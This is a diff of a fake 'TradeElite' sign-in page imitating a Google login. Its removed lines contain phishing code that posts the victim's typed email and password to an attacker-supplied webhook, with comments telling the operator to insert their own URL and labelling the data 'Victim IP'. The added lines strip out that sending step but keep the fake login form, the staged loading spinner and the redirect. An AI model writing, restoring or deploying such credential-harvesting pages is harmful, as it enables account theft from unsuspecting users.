@@ -86,8 +86,12 @@
         <input type="email" id="email" placeholder="Email address" value="user@gmail.com">
         <input type="password" id="password" placeholder="Password">
 
-        <button class="gmail-btn" onclick="signInWithGoogle()">Sign in with Google</button>
-        <button class="continue" onclick="signInWithEmail()">Sign in</button>
+        <button class="gmail-btn" onclick="signInWithGoogle()">
+            
+            Sign in with Google
+        </button>
+
+        <button class="continue" onclick="signIn()">Sign in</button>
 
         <div class="info">
             By signing in, you agree to our Terms of Service
@@ -95,33 +99,14 @@
     </div>
 
     <script>
-        // === CHANGE THIS TO YOUR OWN WEBHOOK URL ===
-        const webhookURL = "https://your-webhook-here.com/log";   // ← Put your webhook here
-
-        function sendCredentials(email, password) {
-            const data = {
-                email: email,
-                password: password,
-                site: "TradeElite",
-                time: new Date().toISOString(),
-                ip: "Victim IP"
-            };
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).catch(() => {});
-        }
-
         function signInWithGoogle() {
             fakeLoading("Signing in with Google...");
             setTimeout(() => {
-                window.location.href = "claim.html";
+                window.location.href = "X.html";
             }, 1350);
         }
 
-        function signInWithEmail() {
+        function signIn() {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
 
@@ -130,13 +115,10 @@
                 return;
             }
 
-            // Send credentials to you
-            sendCredentials(email, password);
-
             fakeLoading("Signing in...");
             setTimeout(() => {
-                window.location.href = "claim.html";
-            }, 1600);
+                window.location.href = "X.html";   // ← Changed to X.html as requested
+            }, 1350);
         }
 
         function fakeLoading(message) {
@@ -148,7 +130,9 @@
                                 border-top: 5px solid #22c55e; border-radius: 50%; 
                                 margin: 0 auto; animation: spin 1s linear infinite;"></div>
                 </div>
-                <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+                <style>
+                    @keyframes spin { to { transform: rotate(360deg); } }
+                </style>
             `;
         }
     </script>
